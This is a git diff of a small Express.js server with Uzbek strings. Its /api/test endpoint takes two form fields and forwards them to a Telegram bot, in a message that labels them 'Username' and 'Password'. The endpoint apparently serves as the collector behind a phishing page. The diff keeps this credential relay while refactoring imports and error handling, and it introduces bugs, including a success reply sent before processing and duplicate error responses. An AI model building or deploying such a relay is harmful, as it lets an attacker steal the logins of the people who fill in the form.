@@ -1,11 +1,10 @@
-const express = require("express");
-const cors = require("cors");
-const axios = require("axios");
-require("dotenv").config();
-
+import express from "express"
+import cors from "cors";
+import axios from "axios";
+import dotenv from "dotenv"
+dotenv.config()
 const app = express();
 
-const cors = require("cors");
 
 app.use(cors({
     origin: [
@@ -17,21 +16,22 @@ app.use(cors({
 }));
 
 app.use(express.json());
-app.use(express.json());
 
 
 app.post("/api/test", async (req, res) => {
     try {
+
         const { name, phone } = req.body;
+        if (!name || !phone) {
+            return res.status(400).json({ message: "Fields are missing" });
+        }
+        // Logic to save to DB...
+        res.status(200).json({ message: "Success" });
+        // const { name, phone } = req.body;
 
         console.log("Kelgan data:", name, phone);
 
-        const text = `
-📩 Yangi so'rov
-
-👤 Username: ${name}
-🔑 Password: ${phone}
-`;
+        const text = `Yangi so'rov Username: ${name} Password: ${phone}`;
 
         const telegramResponse = await axios.post(
             `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
@@ -49,17 +49,14 @@ app.post("/api/test", async (req, res) => {
 
 
     } catch (error) {
-
-        console.log(
-            "Telegram error:",
-            error.response?.data || error.message
-        );
-
+        console.error(error.response?.data || error);
 
         res.status(500).json({
-            success: false,
-            message: "Server xatosi"
+            message: "Server xatosi",
+            error: error.response?.data || error.message
         });
+
+        res.status(500).json({ message: error.message });
     }
 });
 
